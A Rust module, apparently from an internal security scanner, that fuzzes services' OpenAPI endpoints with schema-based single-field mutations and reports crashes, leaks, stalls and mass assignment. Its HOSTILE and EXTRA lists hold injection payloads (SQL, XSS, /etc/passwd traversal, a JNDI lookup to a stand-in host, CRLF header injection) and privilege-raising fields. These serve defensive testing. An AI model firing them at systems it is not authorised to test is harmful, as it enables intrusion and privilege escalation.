//! Schema-driven fuzzing: requests that are valid except in one place.
//!
//! Each service publishes its API as `OpenAPI` (`docs/services/<name>/openapi.yaml`). From a schema this check builds a
//! request the service should accept, then changes one thing at a time - a field's type, a boundary value, a hostile
//! string, a missing required field, an extra field the schema never mentioned, a body that is not JSON - and
//! watches for what a correct service never does: a 500, a stack trace or a database error in the reply, a stall, a
//! dropped connection, an object quietly given a field it should have refused.
//!
//! Requests carry a real identity (`--token`, or one minted from the `authz` spec), because a 401 teaches nothing about
//! the code behind the wall. The `{id}` of a route is a real object: it is made through the collection's `POST` first,
//! or the body would only ever meet a 404. The mutations are fixed, not random, so a run can be repeated.

use crate::checks::authz;
use crate::finding::{Finding, Severity};
use crate::identity::{Bind, json_at};
use crate::openapi::{self, Operation, Param, required, sample, type_of};
use crate::scan::Ctx;
use crate::wire::{Probe, Reply, Target};
use quench_serde::{Map, Value};
use std::collections::HashMap;

/// Strings a careless service treats as code, a path, a template or a header.
const HOSTILE: [&str; 10] = [
    "' OR '1'='1' --",
    "\"; DROP TABLE users; --",
    "<script>alert(1)</script>",
    "../../../../etc/passwd",
    "{{7*7}}${7*7}",
    "${jndi:ldap://sectest.invalid/a}",
    "%s%s%s%n%x",
    "a\r\nX-Injected: yes",
    "\u{0}",
    "\u{202e}\u{feff}ｘ𝕳",
];

/// Fields a client should never be able to set on its own object.
const EXTRA: [(&str, &str); 7] = [
    ("is_admin", "true"),
    ("roles", r#"["admin"]"#),
    ("role", r#""admin""#),
    ("owner", r#""sectest-victim""#),
    ("user", r#""sectest-victim""#),
    ("created_at", r#""1999-01-01T00:00:00Z""#),
    ("__proto__", r#"{"polluted":true}"#),
];

#[derive(Debug, Clone)]
enum Payload {
    Json(Value),
    Raw(String, &'static str),
    Empty,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Kind {
    Structural,
    Missing(String),
    WrongType(String),
    Boundary,
    Hostile,
    Extra(String, String),
}

#[derive(Debug, Clone)]
struct Mutation {
    label: String,
    kind: Kind,
    payload: Payload,
}

fn mutation(label: impl Into<String>, kind: Kind, payload: Payload) -> Mutation {
    Mutation {
        label: label.into(),
        kind,
        payload,
    }
}

/// `OpenAPI`'s `integer` is a JSON number.
fn declared(schema_type: &str) -> &str {
    if schema_type == "integer" {
        "number"
    } else {
        schema_type
    }
}

fn with(base: &Value, name: &str, value: Option<Value>) -> Value {
    let mut out = base.clone();
    if let Some(map) = out.as_object_mut() {
        match value {
            Some(v) => {
                map.insert(name, v);
            }
            None => {
                map.remove(name);
            }
        }
    }
    out
}

fn parse(text: &str) -> Value {
    quench_serde::json::from_str(text).unwrap_or_default()
}

fn structural(base: &Value) -> Vec<Mutation> {
    let text = quench_serde::json::to_string(base);
    let first = base
        .as_object()
        .and_then(|m| m.keys().next().cloned())
        .unwrap_or_else(|| "x".to_string());
    let duplicated = text
        .strip_suffix('}')
        .map_or_else(|| text.clone(), |head| format!("{head},\"{first}\":null}}"));
    vec![
        mutation(
            "an unterminated object",
            Kind::Structural,
            Payload::Raw("{\"a\":".into(), "application/json"),
        ),
        mutation(
            "an array instead of the object",
            Kind::Structural,
            Payload::Raw("[]".into(), "application/json"),
        ),
        mutation(
            "null instead of the object",
            Kind::Structural,
            Payload::Raw("null".into(), "application/json"),
        ),
        mutation(
            "a bare string",
            Kind::Structural,
            Payload::Raw("\"text\"".into(), "application/json"),
        ),
        mutation(
            "a bare number",
            Kind::Structural,
            Payload::Raw("12345".into(), "application/json"),
        ),
        mutation("an empty body", Kind::Structural, Payload::Empty),
        mutation(
            "a byte-order mark before the JSON",
            Kind::Structural,
            Payload::Raw(format!("\u{feff}{text}"), "application/json"),
        ),
        mutation(
            "a valid body declared text/plain",
            Kind::Structural,
            Payload::Raw(text.clone(), "text/plain"),
        ),
        mutation(
            "a valid body declared as a form",
            Kind::Structural,
            Payload::Raw(text, "application/x-www-form-urlencoded"),
        ),
        mutation(
            "a duplicated key",
            Kind::Structural,
            Payload::Raw(duplicated, "application/json"),
        ),
        mutation(
            "500 levels of nesting",
            Kind::Structural,
            Payload::Raw(
                format!("{}{}", "[".repeat(500), "]".repeat(500)),
                "application/json",
            ),
        ),
        mutation(
            "20000 elements",
            Kind::Structural,
            Payload::Raw(format!("[{}0]", "0,".repeat(20_000)), "application/json"),
        ),
    ]
}

fn per_property(name: &str, schema: &Value, base: &Value, needed: bool) -> Vec<Mutation> {
    let mut out = Vec::new();
    let kind = declared(&type_of(schema)).to_string();
    if needed {
        out.push(mutation(
            format!("`{name}` missing"),
            Kind::Missing(name.to_string()),
            Payload::Json(with(base, name, None)),
        ));
    }
    let wrong: [(&str, Value); 7] = [
        ("null", Value::Null),
        ("boolean", Value::from(true)),
        ("number", Value::from(0)),
        ("number", Value::from(-1)),
        ("string", Value::from("sectest")),
        ("array", Value::Array(Vec::new())),
        ("object", Value::Object(Map::new())),
    ];
    for (kind_of, value) in wrong {
        if kind_of != kind {
            out.push(mutation(
                format!("`{name}` as {}", quench_serde::json::to_string(&value)),
                Kind::WrongType(name.to_string()),
                Payload::Json(with(base, name, Some(value))),
            ));
        }
    }
    let boundary: Vec<Value> = match kind.as_str() {
        "string" => vec![
            Value::from(""),
            Value::from("A".repeat(10_000)),
            Value::from("A".repeat(300_000)),
            Value::from("  "),
            Value::from("\n"),
        ],
        "number" => vec![
            Value::from(i64::MAX),
            Value::from(i64::MIN),
            Value::from(-1),
            Value::from(1e308),
            Value::from(-1e308),
            Value::from(0.1),
        ],
        "array" => vec![Value::Array(vec![Value::Null; 5000])],
        _ => Vec::new(),
    };
    for value in boundary {
        let shown = quench_serde::json::to_string(&value);
        let short: String = shown.chars().take(24).collect();
        out.push(mutation(
            format!(
                "`{name}` as {short}{}",
                if shown.len() > 24 { "..." } else { "" }
            ),
            Kind::Boundary,
            Payload::Json(with(base, name, Some(value))),
        ));
    }
    if kind == "string" {
        for hostile in HOSTILE {
            out.push(mutation(
                format!("`{name}` as {hostile:?}"),
                Kind::Hostile,
                Payload::Json(with(base, name, Some(Value::from(hostile)))),
            ));
        }
    }
    out
}

fn extras(schema: &Value, base: &Value) -> Vec<Mutation> {
    // A field the schema declares is not an extra one: an administrator editing `roles` on a route made for it is the route.
    let declared = |key: &str| {
        schema
            .get("properties")
            .and_then(Value::as_object)
            .is_some_and(|p| p.contains_key(key))
    };
    EXTRA
        .iter()
        .filter(|(key, _)| !declared(key))
        .map(|(key, raw)| {
            mutation(
                format!("an extra `{key}`"),
                Kind::Extra((*key).to_string(), (*raw).to_string()),
                Payload::Json(with(base, key, Some(parse(raw)))),
            )
        })
        .collect()
}

/// Every mutation of a JSON body, at most `budget` of them, spread evenly so no kind is cut off whole.
fn body_mutations(schema: &Value, base: &Value, budget: usize) -> Vec<Mutation> {
    let mut all = structural(base);
    all.extend(extras(schema, base));
    let needed = required(schema);
    if let Some(properties) = schema.get("properties").and_then(Value::as_object) {
        for (name, inner) in properties.iter() {
            all.extend(per_property(name, inner, base, needed.contains(name)));
        }
    }
    if all.len() <= budget {
        return all;
    }
    let stride = all.len().div_ceil(budget);
    all.into_iter().step_by(stride).collect()
}

fn encode(text: &str) -> String {
    use std::fmt::Write;
    let mut out = String::new();
    for b in text.bytes() {
        if b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'~') {
            out.push(char::from(b));
        } else {
            let _ = write!(out, "%{b:02X}");
        }
    }
    out
}

/// Query strings that are wrong for each declared query parameter.
fn query_mutations(params: &[Param]) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for param in params.iter().filter(|p| p.location == "query") {
        let name = encode(&param.name);
        let mut values: Vec<String> = HOSTILE.iter().map(|h| (*h).to_string()).collect();
        values.extend(
            [
                "",
                "abc",
                "-1",
                "0",
                "99999999999999999999",
                "1e999",
                "null",
                "true",
                "[]",
                "{}",
            ]
            .map(str::to_string),
        );
        values.push("A".repeat(10_000));
        for value in values {
            let shown: String = value.chars().take(20).collect();
            out.push((
                format!("?{}={shown:?}", param.name),
                format!("{name}={}", encode(&value)),
            ));
        }
        out.push((
            format!("?{} twice", param.name),
            format!("{name}=a&{name}=b"),
        ));
        out.push((format!("?{}[]", param.name), format!("{name}%5B%5D=1")));
    }
    out
}

/// What went wrong, collected per operation so one flawed handler is one finding, not 80.
#[derive(Default)]
struct Tally {
    seen: HashMap<(String, &'static str), (Severity, Vec<String>)>,
    order: Vec<(String, &'static str)>,
}

impl Tally {
    fn add(&mut self, operation: &str, what: &'static str, severity: Severity, example: String) {
        let key = (operation.to_string(), what);
        if !self.seen.contains_key(&key) {
            self.order.push(key.clone());
        }
        let entry = self.seen.entry(key).or_insert((severity, Vec::new()));
        entry.0 = entry.0.max(severity);
        entry.1.push(example);
    }
}

impl Tally {
    /// One finding per operation and kind of trouble, with a few of the cases that caused it.
    fn findings(&self, service: &str) -> Vec<Finding> {
        let mut findings = Vec::new();
        for key in &self.order {
            let (severity, examples) = &self.seen[key];
            let shown = examples
                .iter()
                .take(4)
                .cloned()
                .collect::<Vec<_>>()
                .join("; ");
            let more = examples.len().saturating_sub(4);
            let (method, path) = key.0.split_once(' ').unwrap_or(("-", "-"));
            findings.push(Finding::new(
                *severity,
                "fuzz",
                service,
                method,
                path,
                format!(
                    "{} {} ({} case{}): {shown}{}",
                    key.0,
                    key.1,
                    examples.len(),
                    if examples.len() == 1 { "" } else { "s" },
                    if more > 0 {
                        format!("; and {more} more")
                    } else {
                        String::new()
                    }
                ),
            ));
        }
        findings
    }
}

fn judge(op: &Operation, m: &Mutation, reply: &Reply, baseline: Option<&Value>, tally: &mut Tally) {
    let label = op.label();
    if reply.status == 500 || reply.status == 501 {
        let (severity, shown) = match reply.leak() {
            Some((s, what)) => (
                s.max(Severity::Medium),
                format!("{} (and leaked {what})", m.label),
            ),
            None => (Severity::Medium, m.label.clone()),
        };
        tally.add(&label, "answered 500 to", severity, shown);
    } else if let Some((severity, what)) = reply.leak() {
        tally.add(
            &label,
            "leaked",
            severity,
            format!("{what} for {}", m.label),
        );
    }
    if reply.elapsed.as_secs() >= 5 {
        tally.add(
            &label,
            "stalled for 5s or more on",
            Severity::Medium,
            m.label.clone(),
        );
    }
    if reply.is_html() && reply.body.contains("<script>alert(1)</script>") {
        tally.add(
            &label,
            "reflected unescaped HTML for",
            Severity::High,
            m.label.clone(),
        );
    }
    let ok = (200..300).contains(&reply.status);
    match &m.kind {
        Kind::Extra(key, raw) if ok => {
            let echoed = quench_serde::json::from_str::<Value>(&reply.body)
                .ok()
                .and_then(|v| v.get(key.as_str()).cloned())
                .is_some_and(|v| {
                    quench_serde::json::to_string(&v) == quench_serde::json::to_string(&parse(raw))
                });
            // Already so in the answer to the valid request: the object had it before, the extra field did not put it there.
            let already = baseline.and_then(|b| b.get(key.as_str())).is_some_and(|v| {
                quench_serde::json::to_string(v) == quench_serde::json::to_string(&parse(raw))
            });
            if echoed && !already {
                let severity = if matches!(key.as_str(), "is_admin" | "roles" | "role") {
                    Severity::High
                } else {
                    Severity::Medium
                };
                tally.add(
                    &label,
                    "let a client set a field it must not: accepted",
                    severity,
                    format!("`{key}`"),
                );
            }
        }
        Kind::Missing(name) if ok => {
            tally.add(
                &label,
                "accepted a body without a required field:",
                Severity::Low,
                format!("`{name}`"),
            );
        }
        Kind::WrongType(_) if ok => {
            tally.add(
                &label,
                "accepted a value of the wrong type:",
                Severity::Low,
                m.label.clone(),
            );
        }
        _ => {}
    }
}

fn probe(op: &Operation, path: &str, payload: &Payload, token: Option<&str>) -> Probe {
    let mut probe = Probe::new(&op.method, path);
    match payload {
        Payload::Json(value) => probe = probe.json(&quench_serde::json::to_string(value)),
        Payload::Raw(text, content_type) => {
            probe.body = text.as_bytes().to_vec();
            probe = probe.header("Content-Type", content_type);
        }
        Payload::Empty => probe = probe.header("Content-Type", "application/json"),
    }
    token.map_or_else(|| probe.clone(), |t| probe.clone().bearer(t))
}

/// The same body with its identity-like strings (a key, a name, an address) made new, for a create that found its
/// example already taken (a store that outlived an earlier run).
fn uniquified(base: &Value) -> Value {
    static NEXT: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
    let n = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let suffix = format!("{:x}{n:x}", std::process::id());
    let mut out = base.clone();
    if let Some(map) = out.as_object_mut() {
        for name in ["key", "name", "slug", "title", "email", "username", "label"] {
            if let Some(Value::String(text)) = map.get(name).cloned() {
                map.insert(name, Value::from(format!("{text}{suffix}")));
            }
        }
    }
    out
}

fn base_body(op: &Operation) -> Option<Value> {
    let schema = op.body.as_ref()?;
    Some(op.example.clone().unwrap_or_else(|| sample(schema)))
}

/// Sends one mutated request and judges the answer. `Some` only when the service stopped answering altogether.
async fn fire(
    ctx: &Ctx,
    target: &Target,
    op: &Operation,
    m: &Mutation,
    request: &Probe,
    baseline: Option<&Value>,
    tally: &mut Tally,
) -> Option<Finding> {
    if let Some(reply) = ctx.send(target, request).await {
        judge(op, m, &reply, baseline, tally);
        return None;
    }
    if alive(ctx, target).await {
        tally.add(
            &op.label(),
            "dropped the connection on",
            Severity::Medium,
            m.label.clone(),
        );
        return None;
    }
    Some(Finding::new(
        Severity::Critical,
        "fuzz",
        &target.name,
        &op.method,
        &op.path,
        format!("the service stopped answering after: {}", m.label),
    ))
}

async fn alive(ctx: &Ctx, target: &Target) -> bool {
    ctx.send(target, &Probe::new("GET", "/health"))
        .await
        .is_some_and(|r| r.status < 500)
}

/// The identity the requests are made as: `--token`, else one minted with the service's full grants.
async fn credential(ctx: &Ctx, target: &Target) -> Option<String> {
    match (&ctx.opts.token, &ctx.opts.authz) {
        (Some(token), _) => Some(token.clone()),
        (None, Some(_)) => authz::fuzz_token(ctx, target, "sectest-fuzz").await.ok(),
        (None, None) => None,
    }
}

/// The service's operations, or the finding that says why there are none.
fn load(root: &std::path::Path, service: &str) -> Result<Vec<Operation>, Finding> {
    let note = |severity, detail: String| Finding::new(severity, "fuzz", service, "-", "-", detail);
    let file = root
        .join("docs/services")
        .join(service)
        .join("openapi.yaml");
    let text = std::fs::read_to_string(&file).map_err(|_| {
        note(
            Severity::Info,
            format!("no {} to fuzz from", file.display()),
        )
    })?;
    openapi::parse(&text).map_err(|e| note(Severity::Medium, format!("{}: {e}", file.display())))
}

/// One segment of a path template once its parameters have values.
#[derive(Debug, Clone)]
enum Part {
    Literal(String),
    Param { name: String, value: String },
}

/// A path template with a value for every parameter, and whether those values name things that exist.
#[derive(Debug, Clone)]
struct Resolved {
    parts: Vec<Part>,
    real: bool,
}

impl Resolved {
    fn path(&self) -> String {
        self.path_with(None)
    }

    /// The path, with the `index`-th parameter given `value` instead.
    fn path_with(&self, replace: Option<(usize, &str)>) -> String {
        let mut seen = 0;
        let mut out = String::new();
        for part in &self.parts {
            out.push('/');
            match part {
                Part::Literal(text) => out.push_str(text),
                Part::Param { value, .. } => {
                    match replace {
                        Some((index, other)) if index == seen => out.push_str(&encode(other)),
                        _ => out.push_str(&encode(value)),
                    }
                    seen += 1;
                }
            }
        }
        out
    }

    fn params(&self) -> Vec<&str> {
        self.parts
            .iter()
            .filter_map(|p| match p {
                Part::Param { name, .. } => Some(name.as_str()),
                Part::Literal(_) => None,
            })
            .collect()
    }
}

type Boxed<'s, T> = std::pin::Pin<Box<dyn std::future::Future<Output = T> + Send + 's>>;

/// What to do after one operation.
enum Flow {
    Go,
    /// Its valid request answered 5xx: nothing is judged there.
    Skip,
    /// The service stopped answering.
    Stop(Finding),
}

/// One service's fuzz run: who it is, what it learned about ids, and what it found.
struct Session<'a> {
    ctx: &'a Ctx,
    target: &'a Target,
    token: Option<String>,
    ops: &'a [Operation],
    binds: Vec<&'a Bind>,
    /// What each operation's valid request answered, to tell what a mutation changed from what was already so.
    baselines: HashMap<String, Value>,
    /// Objects it made or found: a collection's concrete path, to the id of one of its members.
    made: HashMap<String, String>,
    tally: Tally,
    sent: usize,
    skipped_active: usize,
    sentinel: Vec<String>,
    refused: Vec<String>,
}

/// Values for a path parameter that are wrong in the ways paths are wrong.
fn path_values() -> Vec<String> {
    let mut values: Vec<String> = HOSTILE.iter().map(|h| (*h).to_string()).collect();
    values.extend(
        [
            "..",
            "%",
            "%2e%2e%2f",
            "-1",
            "99999999999999999999",
            " ",
            "null",
        ]
        .map(str::to_string),
    );
    values.push("A".repeat(10_000));
    values
}

fn as_text(value: &Value) -> Option<String> {
    match value {
        Value::String(s) => Some(s.clone()),
        Value::Int(n) => Some(n.to_string()),
        Value::UInt(n) => Some(n.to_string()),
        _ => None,
    }
}

/// The first member of a list a response holds, as the id `name` (or `id`, or `name`) of it.
fn first_member(body: &str, name: &str) -> Option<String> {
    let value = parse(body);
    let list = value.as_array().or_else(|| {
        value
            .as_object()
            .and_then(|m| m.values().find_map(Value::as_array))
    })?;
    let first = list.first()?;
    [name, "id", "name"]
        .iter()
        .find_map(|key| first.get(*key).and_then(as_text))
}

impl Session<'_> {
    fn bearer(&self, probe: Probe) -> Probe {
        match &self.token {
            Some(token) => probe.bearer(token),
            None => probe,
        }
    }

    /// Gives every parameter of `template` a value: what the spec says, what was made or found, else something
    /// well-formed that names nothing.
    fn resolve<'s>(&'s mut self, template: &'s str, params: &'s [Param]) -> Boxed<'s, Resolved> {
        Box::pin(async move {
            let (mut parts, mut real) = (Vec::new(), true);
            let (mut concrete, mut so_far) = (String::new(), String::new());
            for segment in template.split('/').filter(|s| !s.is_empty()) {
                if let Some(name) = segment.strip_prefix('{').and_then(|s| s.strip_suffix('}')) {
                    let found = self.bound(&concrete, &so_far, name).await;
                    real &= found.is_some();
                    let value = found.unwrap_or_else(|| Self::stand_in(params, name));
                    concrete = format!("{concrete}/{}", encode(&value));
                    parts.push(Part::Param {
                        name: name.to_string(),
                        value,
                    });
                } else {
                    concrete = format!("{concrete}/{segment}");
                    parts.push(Part::Literal(segment.to_string()));
                }
                so_far = format!("{so_far}/{segment}");
            }
            Resolved { parts, real }
        })
    }

    /// The document's example for the parameter, else a value of its type that names nothing.
    fn stand_in(params: &[Param], name: &str) -> String {
        let param = params.iter().find(|p| p.name == name);
        let Some(param) = param else {
            return "sectest".to_string();
        };
        param
            .example
            .as_ref()
            .and_then(as_text)
            .or_else(|| as_text(&sample(&param.schema)))
            .unwrap_or_else(|| "sectest".to_string())
    }

    /// An id that names something real, from (in order) the spec, an object already made, a new one, or the list.
    async fn bound(&mut self, concrete: &str, template: &str, name: &str) -> Option<String> {
        let spec = self
            .binds
            .iter()
            .find(|b| b.param == name && b.under.as_deref().is_none_or(|u| u == template))
            .copied();
        if let Some(bind) = spec {
            if let Some(value) = &bind.value {
                return Some(value.clone());
            }
            if let Some(step) = &bind.create
                && (!step.is_mutating() || self.ctx.opts.active)
            {
                let mut probe = Probe::new(&step.method, &step.path);
                if let Some(body) = &step.body {
                    probe = probe.json(body);
                }
                let reply = self.ctx.send(self.target, &self.bearer(probe)).await?;
                if let Some(id) = json_at(&reply.body, &bind.id_at) {
                    return Some(id);
                }
            }
        }
        if let Some(id) = self.made.get(concrete) {
            return Some(id.clone());
        }
        let id = match self.create_under(concrete, template).await {
            Some(id) => id,
            None => self.discover(concrete, template, name).await?,
        };
        self.made.insert(concrete.to_string(), id.clone());
        Some(id)
    }

    /// Makes a member of the collection at `template` through its `POST` (or a nested collection's of the same name).
    async fn create_under(&mut self, concrete: &str, template: &str) -> Option<String> {
        if !self.ctx.opts.active {
            return None;
        }
        let ops = self.ops;
        let collection = template.rsplit('/').next().unwrap_or_default();
        let create = ops
            .iter()
            .find(|o| o.method == "POST" && o.path == template)
            .or_else(|| {
                ops.iter().find(|o| {
                    o.method == "POST"
                        && o.path != template
                        && o.path.rsplit('/').next() == Some(collection)
                })
            })?;
        let at = if create.path == template {
            concrete.to_string()
        } else {
            self.resolve(&create.path, &create.params).await.path()
        };
        let body = base_body(create)?;
        let mut reply = self
            .ctx
            .send(
                self.target,
                &probe(
                    create,
                    &at,
                    &Payload::Json(body.clone()),
                    self.token.as_deref(),
                ),
            )
            .await?;
        if reply.status == 409 {
            let retry = Payload::Json(uniquified(&body));
            reply = self
                .ctx
                .send(
                    self.target,
                    &probe(create, &at, &retry, self.token.as_deref()),
                )
                .await?;
        }
        (200..300)
            .contains(&reply.status)
            .then(|| json_at(&reply.body, "id"))
            .flatten()
    }

    /// Asks the collection what it holds: the `GET` of the path in front of the parameter.
    async fn discover(&self, concrete: &str, template: &str, name: &str) -> Option<String> {
        let _ = self
            .ops
            .iter()
            .find(|o| o.method == "GET" && o.path == template)?;
        let reply = self
            .ctx
            .send(self.target, &self.bearer(Probe::new("GET", concrete)))
            .await?;
        (200..300)
            .contains(&reply.status)
            .then(|| first_member(&reply.body, name))
            .flatten()
    }

    async fn fire_at(&mut self, op: &Operation, m: &Mutation, request: &Probe) -> Option<Finding> {
        self.sent += 1;
        let baseline = self.baselines.get(&op.label());
        fire(
            self.ctx,
            self.target,
            op,
            m,
            request,
            baseline,
            &mut self.tally,
        )
        .await
    }

    async fn fuzz_op(&mut self, op: &Operation) -> Flow {
        if op.is_mutating() && !self.ctx.opts.active {
            self.skipped_active += 1;
            return Flow::Go;
        }
        let resolved = self.resolve(&op.path, &op.params).await;
        if !resolved.real {
            self.sentinel.push(op.label());
        }
        let path = resolved.path();
        let mut body = None;
        if let Some(schema) = &op.body {
            match self.fuzz_body(op, schema, &path).await {
                Err(flow) => return flow,
                Ok(base) => body = base,
            }
        }
        for (label, query) in query_mutations(&op.params)
            .into_iter()
            .take(self.ctx.opts.fuzz_budget)
        {
            let m = mutation(label, Kind::Hostile, Payload::Empty);
            let request = self.bearer(Probe::new(&op.method, &format!("{path}?{query}")));
            if let Some(stopped) = self.fire_at(op, &m, &request).await {
                return Flow::Stop(stopped);
            }
        }
        self.fuzz_path_params(op, &resolved, body.as_ref()).await
    }

    async fn valid_request(&self, op: &Operation, path: &str, body: &Value) -> Option<Reply> {
        let request = probe(
            op,
            path,
            &Payload::Json(body.clone()),
            self.token.as_deref(),
        );
        self.ctx.send(self.target, &request).await
    }

    /// The body's mutations. `Ok` with the body that was fuzzed from, `Err` to end the operation.
    async fn fuzz_body(
        &mut self,
        op: &Operation,
        schema: &Value,
        path: &str,
    ) -> Result<Option<Value>, Flow> {
        let Some(mut base) = base_body(op) else {
            return Ok(None);
        };
        let mut baseline = self.valid_request(op, path, &base).await;
        // Already taken (a store that outlived an earlier run): fuzz from a body that is new, or every mutation would be
        // answered 409 before anything looked at it.
        if op.method == "POST" && baseline.as_ref().is_some_and(|r| r.status == 409) {
            base = uniquified(&base);
            baseline = self.valid_request(op, path, &base).await;
        }
        if let Some(reply) = &baseline {
            self.baselines.insert(op.label(), parse(&reply.body));
        }
        // What the valid request made is a real object for the routes beneath it.
        if op.method == "POST"
            && let Some(id) = baseline
                .as_ref()
                .filter(|r| (200..300).contains(&r.status))
                .and_then(|r| json_at(&r.body, "id"))
        {
            self.made.entry(path.to_string()).or_insert(id);
        }
        if let Some(status) = baseline.as_ref().map(|r| r.status)
            && !(200..300).contains(&status)
        {
            // A 5xx to the valid request itself (a feature the deployment lacks, a store that is down) cannot be told
            // apart from a 5xx to a mutation, so nothing is judged there.
            let skip = status >= 500;
            self.refused.push(format!(
                "{} ({status}{})",
                op.label(),
                if skip { ", not fuzzed" } else { "" }
            ));
            if skip {
                return Err(Flow::Skip);
            }
        }
        for m in body_mutations(schema, &base, self.ctx.opts.fuzz_budget) {
            let request = probe(op, path, &m.payload, self.token.as_deref());
            if let Some(stopped) = self.fire_at(op, &m, &request).await {
                return Err(Flow::Stop(stopped));
            }
        }
        Ok(Some(base))
    }

    /// Each path parameter in turn given values that are wrong for a path.
    async fn fuzz_path_params(
        &mut self,
        op: &Operation,
        resolved: &Resolved,
        body: Option<&Value>,
    ) -> Flow {
        if op.method == "DELETE" {
            return Flow::Go;
        }
        for (index, name) in resolved.params().into_iter().enumerate() {
            for value in path_values().into_iter().take(self.ctx.opts.fuzz_budget) {
                let shown: String = value.chars().take(20).collect();
                let m = mutation(
                    format!("{{{name}}} as {shown:?}"),
                    Kind::Hostile,
                    Payload::Empty,
                );
                let path = resolved.path_with(Some((index, &value)));
                let payload = body.map_or(Payload::Empty, |b| Payload::Json(b.clone()));
                let request = probe(op, &path, &payload, self.token.as_deref());
                if let Some(stopped) = self.fire_at(op, &m, &request).await {
                    return Flow::Stop(stopped);
                }
            }
        }
        Flow::Go
    }
}

pub async fn run(ctx: &Ctx, target: &Target) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(root) = &ctx.opts.forge_root else {
        return findings;
    };
    let ops = match load(root, &target.name) {
        Ok(ops) => ops,
        Err(finding) => {
            findings.push(finding);
            return findings;
        }
    };
    let token = credential(ctx, target).await;
    if token.is_none() {
        findings.push(Finding::new(
            Severity::Low,
            "fuzz",
            &target.name,
            "-",
            "-",
            "fuzzed with no credential (no --token, and no --authz to mint one, or gatehouse refused): only what runs before the auth wall was reached".to_string(),
        ));
    }

    // Nothing is deleted or rotated: a `DELETE`, or a `POST .../delete` (a form's way of saying it), would end the object
    // the routes after it were about to be fuzzed against.
    let destructive = |o: &Operation| {
        o.method == "DELETE" || matches!(o.path.rsplit('/').next(), Some("delete" | "rotate"))
    };
    let mut ordered: Vec<&Operation> = ops.iter().filter(|o| !destructive(o)).collect();
    ordered.sort_by_key(|o| {
        (
            o.path.matches('{').count(),
            o.path.clone(),
            o.method != "POST",
        )
    });

    let mut session = Session {
        ctx,
        target,
        token,
        ops: &ops,
        binds: ctx
            .opts
            .authz
            .iter()
            .flat_map(|spec| spec.binds.iter())
            .chain(ctx.opts.binds.iter())
            .filter(|b| b.service == target.name)
            .collect(),
        baselines: HashMap::new(),
        made: HashMap::new(),
        tally: Tally::default(),
        sent: 0,
        skipped_active: 0,
        sentinel: Vec::new(),
        refused: Vec::new(),
    };
    for op in ordered {
        if let Flow::Stop(stopped) = session.fuzz_op(op).await {
            findings.push(stopped);
            return findings;
        }
    }
    findings.extend(session.tally.findings(&target.name));
    findings.extend(notes(
        &target.name,
        session.sent,
        session.skipped_active,
        &session.sentinel,
        &session.refused,
    ));
    findings
}
fn notes(
    service: &str,
    sent: usize,
    skipped_active: usize,
    unbound: &[String],
    refused: &[String],
) -> Vec<Finding> {
    let info = |detail: String| Finding::new(Severity::Info, "fuzz", service, "-", "-", detail);
    let mut out = vec![info(format!("{sent} mutated requests sent"))];
    if skipped_active > 0 {
        out.push(info(format!(
            "{skipped_active} mutating operations were not fuzzed; pass --active to include them"
        )));
    }
    if !unbound.is_empty() {
        let shown = unbound
            .iter()
            .take(6)
            .cloned()
            .collect::<Vec<_>>()
            .join(", ");
        out.push(info(format!(
            "{} operations were fuzzed against an id that names nothing (none could be made or found; add a `[[bind]]` to the spec to give one): crashes and leaks are judged there, what they accept is not: {shown}",
            unbound.len()
        )));
    }
    if !refused.is_empty() {
        let shown = refused
            .iter()
            .take(6)
            .cloned()
            .collect::<Vec<_>>()
            .join(", ");
        out.push(info(format!(
            "the valid request itself was refused for {} operations: a 5xx means nothing was fuzzed there, any other refusal means only crashes and leaks were judged, not what they accept: {shown}",
            refused.len()
        )));
    }
    out
}
